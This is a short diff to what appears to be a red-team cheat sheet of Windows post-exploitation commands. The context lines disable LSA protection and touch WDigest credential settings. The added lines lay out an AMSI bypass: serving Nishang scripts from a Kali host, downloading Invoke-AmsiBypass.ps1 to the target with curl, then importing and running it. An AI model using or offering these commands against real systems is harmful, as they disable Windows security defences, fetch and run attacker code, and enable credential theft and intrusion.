@@ -168,6 +168,18 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 
 - Disable LSA protection
 reg add HKLM\SYSTEM\CurrentControlSet\Control\LSA /v RunAsPPL /t REG_DWORD /d 0 /f
+
+- Bypass AMSI
+Kali
+cd /opt/Nishang/Bypass/
+python3 -m http.server 80
+
+Target
+Open Command Prompt
+powershell -nop -exe bypass
+curl http://kali IP/Invoke-AmsiBypass.ps1 -o test.ps1
+Import-Module .\test.ps1
+Invoke-AmsiBypass -Verbose
 ------------------------------------------------------------------------------------------------------------------------------------------------------
 
 # Persistence
